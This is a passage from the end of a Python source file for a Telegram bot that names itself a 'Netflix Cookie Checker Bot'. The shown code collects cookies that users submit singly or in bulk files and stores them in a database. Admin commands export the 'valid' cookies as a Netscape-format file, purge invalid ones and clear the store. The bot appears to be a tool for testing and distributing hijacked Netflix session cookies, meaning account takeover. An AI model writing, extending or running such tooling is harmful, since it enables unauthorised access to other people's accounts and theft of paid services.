        f.write(f"# Exported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total: {len(cookies)}\n\n")
        for cookie in cookies:
            # Write each cookie as stored (multi-line Netscape preserved)
            f.write(cookie['cookie'])
            f.write("\n\n")  # Separate cookies with blank line
    with open(filepath, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=filename,
            caption=f"✅ {len(cookies)} valid cookies exported."
        )
    os.remove(filepath)

@admin_required
async def admin_cleanup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("🔄 Cleaning up invalid cookies...")
    deleted = db.delete_invalid_cookies()
    await msg.edit_text(f"✅ Deleted {deleted} invalid/expired cookies.")

@admin_required
async def admin_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Yes, clear all", callback_data="clear_confirm"),
         InlineKeyboardButton("❌ Cancel", callback_data="clear_cancel")]
    ])
    await update.message.reply_text(
        "⚠️ *DANGER: Clear All Cookies*\n\nThis will delete ALL cookies from the database.\nThis action cannot be undone.\n\nAre you sure?",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

async def clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "clear_confirm":
        user_id = query.from_user.id
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("❌ Unauthorized.")
            return
        total = db.cookies.count_documents({})
        db.cookies.delete_many({})
        await query.edit_message_text(f"✅ Cleared {total} cookies from database.")
    else:
        await query.edit_message_text("❌ Operation cancelled.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error: {context.error}")
    try:
        await update.message.reply_text("⚠️ Internal error occurred. Please try again.")
    except:
        pass

def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set!")
        sys.exit(1)
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", start))
    application.add_handler(CommandHandler("check", check_single))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("valid", valid_cookies))
    
    bulk_conv = ConversationHandler(
        entry_points=[CommandHandler("bulk", bulk_start)],
        states={
            BULK_CHECK_STATE: [
                MessageHandler(filters.Document.ALL, handle_bulk_file),
                MessageHandler(filters.TEXT & ~filters.COMMAND,
                               lambda update, context: update.message.reply_text("Please send a .txt file or /cancel."))
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_bulk)]
    )
    application.add_handler(bulk_conv)
    
    application.add_handler(CommandHandler("approve", admin_approve))
    application.add_handler(CommandHandler("disapprove", admin_disapprove))
    application.add_handler(CommandHandler("users", admin_users))
    application.add_handler(CommandHandler("cookies", admin_cookies))
    application.add_handler(CommandHandler("export", admin_export))
    application.add_handler(CommandHandler("cleanup", admin_cleanup))
    application.add_handler(CommandHandler("clear", admin_clear))
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_message))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(callback_handler, pattern="^(upload_|restart)"))
    application.add_handler(CallbackQueryHandler(clear_callback, pattern="^clear_"))
    
    application.add_error_handler(error_handler)
    logger.info("Netflix Cookie Checker Bot started!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()